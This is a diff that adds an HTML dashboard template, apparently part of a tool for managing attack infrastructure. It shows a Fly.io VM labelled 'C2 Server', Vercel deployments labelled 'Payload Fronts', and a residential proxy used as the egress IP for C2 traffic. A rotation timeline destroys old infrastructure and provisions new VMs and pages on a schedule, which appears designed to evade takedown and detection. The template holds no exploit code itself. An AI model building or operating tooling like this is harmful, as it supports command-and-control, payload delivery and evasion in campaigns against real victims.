@@ -1,0 +1,109 @@
+<!-- templates/deployments.html -->
+{% extends "base.html" %}
+{% block title %}Deployments{% endblock %}
+{% block nav_deployments %}active{% endblock %}
+
+{% block content %}
+<div class="page-header">
+    <h2>🚀 Active Deployments</h2>
+    <div class="meta">Fly.io VMs · Vercel pages · proxy status</div>
+</div>
+
+<!-- Fly VM -->
+<div class="card">
+    <div class="card-header">
+        <div class="card-title">Fly.io VM — C2 Server</div>
+        <div class="card-subtitle">
+            {% if fly %}
+                <span class="badge green">Running</span>
+                {{ fly.region }} · {{ fly.app_name }}
+            {% else %}
+                <span class="badge yellow">Provisioning...</span>
+            {% endif %}
+        </div>
+    </div>
+    {% if fly %}
+    <table>
+        <tr><td style="width:200px;color:var(--text-dim);">App Name</td><td class="mono">{{ fly.app_name }}</td></tr>
+        <tr><td style="color:var(--text-dim);">VM ID</td><td class="mono">{{ fly.vm_id }}</td></tr>
+        <tr><td style="color:var(--text-dim);">IP Address</td><td class="mono">{{ fly.ip }}</td></tr>
+        <tr><td style="color:var(--text-dim);">Internal Port</td><td class="mono">{{ fly.internal_port }}</td></tr>
+        <tr><td style="color:var(--text-dim);">Region</td><td class="mono">{{ fly.region }}</td></tr>
+        <tr><td style="color:var(--text-dim);">Session Key</td><td class="mono">{{ fly.session_key[:16] }}...</td></tr>
+    </table>
+    {% endif %}
+</div>
+
+<!-- Vercel deployments -->
+<div class="card">
+    <div class="card-header">
+        <div class="card-title">Vercel Pages — Payload Fronts</div>
+        <div class="card-subtitle">{{ vercel | length }} active deployments</div>
+    </div>
+    {% if vercel %}
+    <table>
+        <thead>
+            <tr><th>Project</th><th>URL</th><th>Deployment ID</th><th>Actions</th></tr>
+        </thead>
+        <tbody>
+            {% for v in vercel %}
+            <tr>
+                <td class="mono">{{ v.project_name }}</td>
+                <td><a href="https://{{ v.deployment_url }}" target="_blank" class="mono">{{ v.deployment_url }}</a></td>
+                <td class="mono" style="font-size:11px;">{{ v.deployment_id[:20] }}...</td>
+                <td><a href="https://{{ v.deployment_url }}" target="_blank" class="btn btn-sm">Open</a></td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+    {% else %}
+    <div style="color:var(--text-dim);padding:20px;text-align:center;">No Vercel deployments active.</div>
+    {% endif %}
+</div>
+
+<!-- Proxy status -->
+<div class="card">
+    <div class="card-header">
+        <div class="card-title">Residential Proxy</div>
+        <div class="card-subtitle">Egress IP for C2 outbound traffic</div>
+    </div>
+    {% if proxy and proxy.exit_ip %}
+    <table>
+        <tr><td style="width:200px;color:var(--text-dim);">Exit IP</td><td class="mono">{{ proxy.exit_ip }}</td></tr>
+        <tr><td style="color:var(--text-dim);">Session ID</td><td class="mono">{{ proxy.session_id }}</td></tr>
+        <tr><td style="color:var(--text-dim);">Proxy URL</td><td class="mono">{{ proxy.proxy_url[:40] }}...</td></tr>
+        <tr><td style="color:var(--text-dim);">Rotation Token</td><td class="mono">{{ proxy.rotation_token }}</td></tr>
+    </table>
+    {% else %}
+    <div style="color:var(--text-dim);padding:20px;text-align:center;">Proxy not yet rotated.</div>
+    {% endif %}
+</div>
+
+<!-- Rotation timeline -->
+<div class="card">
+    <div class="card-header">
+        <div class="card-title">Rotation Timeline</div>
+        <div class="card-subtitle">
+            {% if cycle.status == "active" %}
+                Next rotation in {{ cycle.remaining_seconds // 60 }}m {{ cycle.remaining_seconds % 60 }}s
+            {% endif %}
+        </div>
+    </div>
+    <div style="padding:20px;">
+        <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;">
+            <div style="width:12px;height:12px;border-radius:50%;background:var(--green);"></div>
+            <div>
+                <div style="font-size:13px;">Current cycle: {{ cycle.cycle_ts }}</div>
+                <div style="font-size:11px;color:var(--text-dim);">{{ cycle.elapsed_seconds // 60 }}m elapsed</div>
+            </div>
+        </div>
+        <div style="display:flex;align-items:center;gap:12px;color:var(--text-dim);">
+            <div style="width:12px;height:12px;border-radius:50%;border:2px solid var(--border);"></div>
+            <div>
+                <div style="font-size:13px;">Next cycle: auto-provisions at rotation</div>
+                <div style="font-size:11px;">Old infra will be destroyed · new VM + Vercel pages created</div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
